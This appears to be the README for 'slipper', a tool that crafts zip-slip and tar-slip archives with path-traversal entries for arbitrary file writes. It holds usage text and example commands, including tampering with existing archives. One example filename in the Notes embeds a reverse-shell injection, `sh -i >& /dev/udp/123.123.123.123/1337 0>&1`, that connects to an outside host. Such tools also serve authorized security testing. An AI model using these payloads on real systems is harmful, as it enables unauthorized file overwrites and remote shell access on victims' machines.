
# Slipper - a tool to build zip and tar slip payloads 

Build zip and tar slip payloads (directory traversals for file writes). Details in the [snyk github](https://github.com/snyk/zip-slip-vulnerability) for known vulnerable items.


```

usage: slipper.py [-h]
                  [-p filename contents]
                  (-z ZIP_FILENAME | -t TAR_FILENAME)
                  [-i INPUT_FILENAME]

options:
  -h, --help         show this help
                     message and exit
  -p filename contents, --payload filename contents
                     add filename with
                     contents to archive
  -z ZIP_FILENAME, --zip_filename ZIP_FILENAME
                     create a zip with
                     given name
  -t TAR_FILENAME, --tar_filename TAR_FILENAME
                     create a tar with
                     given name
  -i INPUT_FILENAME, --input_filename INPUT_FILENAME
                     create a zip or tar
                     with the given
                     archive as a
                     starting point

```
## Notes

* The argument `-p` can be repeated to add multiple `filename, content` pairs to each archive type.
* Filenames in archives can contain characters that are typically problematic on the filesystem, e.g.:
```
/conf/`sh -i >& /dev/udp/123.123.123.123/1337 0>&1`
```


# Examples
## Zip 

Supply the filename with the `-z` flag:

`python slipper.py -z foo.zip -p '../../../../tmp/file.txt' 'text in /tmp/file.txt' -p 'required.xml' '...'`

## Zip append

Supply the filename with the `-z` flag as above, and a starting point tarball with `-i`:

```
python slipper.py -i input.zip -z tampered.zip -p 'new/file.txt' 'content'
```

## Tar 

Supply the filename with the `-t` flag:

`python slipper.py -t some.tar -p '../../../../tmp/file.txt' 'text in /tmp/file.txt' `

## Tar append

Supply the filename with the `-t` flag as above, and a starting point tarball with `-i`:

```
python slipper.py -i input.tar -t tampered.tar -p 'new/file.txt' 'content'
```
